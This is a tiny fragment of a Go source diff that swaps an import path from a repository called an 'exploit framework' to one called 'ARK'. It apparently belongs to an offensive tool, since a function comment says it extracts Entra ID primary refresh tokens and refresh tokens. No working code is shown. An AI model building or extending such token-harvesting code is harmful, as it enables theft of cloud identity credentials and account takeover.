@@ -10,7 +10,7 @@ import (
 	"syscall"
 	"unsafe"
 
-	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
+	pb "github.com/KKingZero/ARK/pkg/pb"
 )
 
 // harvestEntraToken extracts Entra ID PRT and refresh tokens.
